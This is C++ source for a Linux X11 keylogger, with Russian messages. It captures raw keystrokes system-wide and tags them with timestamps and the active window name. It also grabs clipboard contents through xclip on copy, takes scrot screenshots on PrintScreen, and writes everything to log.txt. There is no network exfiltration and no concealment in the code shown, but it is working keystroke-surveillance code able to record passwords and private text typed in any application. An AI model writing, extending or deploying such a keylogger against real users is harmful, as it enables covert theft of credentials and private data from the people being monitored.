#include <iostream>
#include <X11/Xlib.h>
#include <X11/extensions/XInput2.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <string>
#include <fstream>
#include <cstring> 
#include <ctime>
#include <memory>
#include <array>
#include <functional>

#include "utils/cyrillicHelper/cyrillicHelper.hpp"
#include "utils/specialKeysHelper/specialKeysHelper.hpp"
#include "utils/keyPressHelper/keyPressHelper.hpp"
#include "utils/processTrackingHelper/processTracking.hpp"


std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    
    std::function<int(FILE*)> deleter = pclose; 
    
    std::unique_ptr<FILE, std::function<int(FILE*)>> pipe(popen(cmd, "r"), deleter);
    
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

std::string getCurrentTimestamp() {
    time_t now = time(0);
    tm* ltm = localtime(&now);

    char buffer[9]; 
    
    strftime(buffer, sizeof(buffer), "%H:%M:%S", ltm);

    return std::string(buffer);
}

static void writeLog(const std::string& log_buffer) {
    std::ofstream file("log.txt");
    if (!file) {
        std::cerr << "Не удалось открыть файл для записи!" << std::endl;
        return;
    }
    file << log_buffer;
    file.close();
}

void trim_leading_newlines(std::string& s) {
    size_t first_char = s.find_first_not_of('\n');

    if (std::string::npos != first_char) {
        s.erase(0, first_char);
    } else {
        s.clear();
    }
}

int main() {
  
    Display* display = XOpenDisplay(NULL);
    if (!display) {
        std::cerr << "Не удалось подключиться к X-серверу." << std::endl;
        return 1;
    }

    int xi_opcode, event, error;
    if (!XQueryExtension(display, "XInputExtension", &xi_opcode, &event, &error)) {
        std::cerr << "Расширение XInput не доступно." << std::endl;
        XCloseDisplay(display);
        return 1;
    }
    
    Window root = DefaultRootWindow(display);
    
    XIEventMask evmask;
    unsigned char mask_bytes[XI_LASTEVENT] = {0}; 
    XISetMask(mask_bytes, XI_RawKeyPress);
    XISetMask(mask_bytes, XI_RawKeyRelease);
    
    evmask.deviceid = XIAllMasterDevices; 
    evmask.mask_len = sizeof(mask_bytes);
    evmask.mask = mask_bytes;

    XISelectEvents(display, root, &evmask, 1);
    XFlush(display);

    std::cout << "Пассивный перехват запущен. Нажимайте клавиши..." << std::endl;
    std::cout << "Нажмите Escape для выхода." << std::endl;

    std::string log_buffer = "";
    XEvent xevent;
    std::string windowName;
    bool ctrlPressed = false;

    while (true) {
        XNextEvent(display, &xevent);

        std::string temp = windowName;
        windowName = windowTracking(display);
        if (windowName != temp && !windowName.empty()){
            log_buffer += "\n\n\n" + getCurrentTimestamp() + " - [Active Window: " + windowName + "]\n\n"; 
        }
        
        if (xevent.xcookie.type == GenericEvent && xevent.xcookie.extension == xi_opcode) {
            XGetEventData(display, &xevent.xcookie);

            if (xevent.xcookie.evtype == XI_RawKeyPress) {
                XIRawEvent* rawev = (XIRawEvent*)xevent.xcookie.data;
                
                KeyPressResult result = processKeyPress(display, rawev, ctrlPressed);

                if (result.should_exit) {
                    std::cout << "\nНажата клавиша: " << result.printable_name << std::endl;
                    XFreeEventData(display, &xevent.xcookie);
                    break;
                }

                if (result.should_grabBuffer) {
                    std::string clipboard_text = exec("xclip -selection clipboard -o");
                    std::cout<<"Copied: " << clipboard_text<< std::endl;
                    log_buffer += "\n\n" + getCurrentTimestamp() + " - Copied:[\n" + clipboard_text + "\n]\n";
                    continue;
                }

                if (result.should_grabScreen) {
                    std::cout << "PrintScreen нажат. Делаю скриншот..." << std::endl;

                    std::string filename = getCurrentTimestamp();
                    std::string command = "scrot 'screenshots/screenshot_" + filename + ".png'";

                    system(command.c_str());
                    system("mkdir -p screenshots");

                    std::cout << "Скриншот сохранен в папке 'screenshots'." << std::endl;
                    continue;
                }

                if (result.printable_name) {
                    std::cout << "Нажата клавиша: " << result.printable_name << std::endl;
                }

                if (!result.char_to_log.empty()) {
                    if (result.char_to_log == "\b" && !log_buffer.empty()) {
                        log_buffer.pop_back(); 
                    } else if (result.char_to_log != "\b") {
                        log_buffer += result.char_to_log;
                    }
                }
            }

            if (xevent.xcookie.evtype == XI_RawKeyRelease) {
                XIRawEvent* rawev = (XIRawEvent*)xevent.xcookie.data;
                KeySym keysym = XkbKeycodeToKeysym(display, rawev->detail, 0, 0);

                
                if (keysym == XK_Control_L) {
                    ctrlPressed = false;
                }
            }
            
            XFreeEventData(display, &xevent.xcookie);
        }
    }

    std::cout << "Завершение работы... Запись лога..." << std::endl;
    trim_leading_newlines(log_buffer);
    writeLog(log_buffer);
    std::cout << "Лог записан в log.txt" << std::endl;
    
    XCloseDisplay(display);
}